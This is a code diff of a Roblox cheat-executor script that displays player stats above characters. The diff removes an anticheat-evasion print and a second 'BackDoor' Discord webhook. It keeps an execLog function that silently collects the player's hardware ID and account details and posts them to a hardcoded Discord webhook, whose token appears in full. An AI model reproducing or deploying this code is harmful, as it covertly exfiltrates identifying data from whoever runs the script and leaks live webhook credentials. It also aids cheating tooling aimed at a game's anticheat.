@@ -1,13 +1,7 @@
-print(";;!1")
-
-print("ur safe from the anticheat")
-
 getgenv().hideuser = false
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
-
-print(";;!2")
 
 -- Transformation map
 local transformationMap = {
@@ -38,8 +32,22 @@ local transformationMap = {
 
 local function format_number(number)
     local suffixes = {
-        "", "K", "M", "B", "T", "QD", "QN", "SX", "SP", "OC", "NO", "DC",
-        "UnD", "DD", "TD", "QaD", "QiD", "SD", "SpD", "OcD", "NoD", "ViG"
+        "", "K", "M", "B", "T",
+        "QD", "QN", "SX", "SP", "Oc", "No", "Dec",
+        "UnD", "DD", "TD", "QdD", "QND", "SXD", 
+        "SPD", "OD", "ND", "VN", "UVN", "DUOVN",
+        "TREVN","QVN","SXVN","SPVN","OCVN","NOVN",
+        "TRI","UTri","DuoTri","TreTri","QdTri","QnTri",
+        "SxTri","SpTri","OcTri","NoTri","Qua","UQua",
+        "DQua","TQua","QdQua","QnQua","QnQua","SxQua",
+        "SpQua","OcQua","NoQua","Qnt","UQnt","DQnt",
+        "TQnt","QdQnt","QnQnt","SxQnt","SpQnt","OcQnt",
+        "NoQnt","Sxa","USxa","DSxa","TSxa","QdSxa","QnSxa",
+        "SxSxa","SpSxa","OcSxa","NoSxa","Spt","USpt","DSpt",
+        "TSpt","QdSpt","QnSpt","SxSpt","SpSpt","OcSpt","NoSpt",
+        "Oct","UOct","DOct","TOct","QdOct","QnOct","SxOct","SpOct",
+        "OcOct","NoOct","Non","UNon","DNon","TNon","QdNon","QnNon",
+        "SxNon","SpNon","OcNon","NoNon","Ce","UCe","DCe"
     }
     local suffix_index = 1
     while math.abs(number) >= 1000 and suffix_index < #suffixes do
@@ -91,9 +99,6 @@ local function getStatColor(totalStats)
         return Color3.fromRGB(255, 255, 255)
     end
 end
-
-print(";;!3")
-
 
 -- Billboard updater
 local function updateBillboard(billboard, player)
@@ -198,8 +203,6 @@ local function execLog()
     local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
     local HttpService = game:GetService("HttpService")
 
-    getgenv().BackDoor = "https://discord.com/api/webhooks/1364811382813364315/H7KX4N89YGtoIsgAHy6Nxj_kZ3Ks33w7Tgb7x8mpfS2L3z8eT8YS22smKeu4GPZ2uUMw"
-
     local player = Players.LocalPlayer
     local hwid = RbxAnalyticsService:GetClientId()
 
@@ -271,49 +274,25 @@ local function execLog()
         ["avatar_url"] = imageUrl,
     }
 
-local requestFunction = syn and syn.request or http_request or request
-if requestFunction then
-    local function sendToWebhook(url, username, avatar)
-        local payloadClone = HttpService:JSONDecode(HttpService:JSONEncode(payload))
-        payloadClone["username"] = username
-        payloadClone["avatar_url"] = avatar
-
-        return pcall(function()
+    local requestFunction = syn and syn.request or http_request or request
+    if requestFunction then
+        local success, response = pcall(function()
             return requestFunction({
-                Url = url,
+                Url = "https://discord.com/api/webhooks/1332946018639151124/CeV_MFyH-8nZzv-IlNyariOHCCiZN8U7Ih-02Qjcgjp1YhYFAu0XcDXtgL2BoF_g0KpV",
                 Method = "POST",
                 Headers = { ["Content-Type"] = "application/json" },
-                Body = HttpService:JSONEncode(payloadClone)
+                Body = HttpService:JSONEncode(payload)
             })
         end)
-    end
 
-    -- Send to primary webhook
-    local success1, response1 = sendToWebhook(
-        "https://discord.com/api/webhooks/1332946018639151124/CeV_MFyH-8nZzv-IlNyariOHCCiZN8U7Ih-02Qjcgjp1YhYFAu0XcDXtgL2BoF_g0KpV",
-        "Stat Logger",
-        "https://images-ext-1.discordapp.net/external/l5-KoXA2mt7NrUE6gWvxiprX6o72ojZeBHhDDdoI9IE/%3Fsize%3D4096/https/cdn.discordapp.com/icons/1320931723717902376/174fde885a08dfd98be5ffefa681b07d.png?format=webp&quality=lossless&width=663&height=663"
-    )
-
-    -- Send to BackDoor webhook
-    local success2, response2 = sendToWebhook(
-        getgenv().BackDoor,
-        "BackDoor",
-        "https://media.discordapp.net/attachments/1364811197186179085/1364812119601840220/psersonpfp.jpg?ex=680b07d6&is=6809b656&hm=6274061509a56dbc4081a3e0733147007fdd772047a9d12c021366742874a3fb&=&format=webp&width=200&height=200"
-    )
-
-    if success1 and response1 and response1.Success and success2 and response2 and response2.Success then
-        print("yea")
+        if success and response and response.Success then
+            print("yea")
+        else
+            warn("nah")
+        end
     else
-        warn("nah")
+        warn("?")
     end
-else
-    warn("?")
 end
 
-
 pcall(execLog)
-
-print(";;!4")
-print("loaded")
-
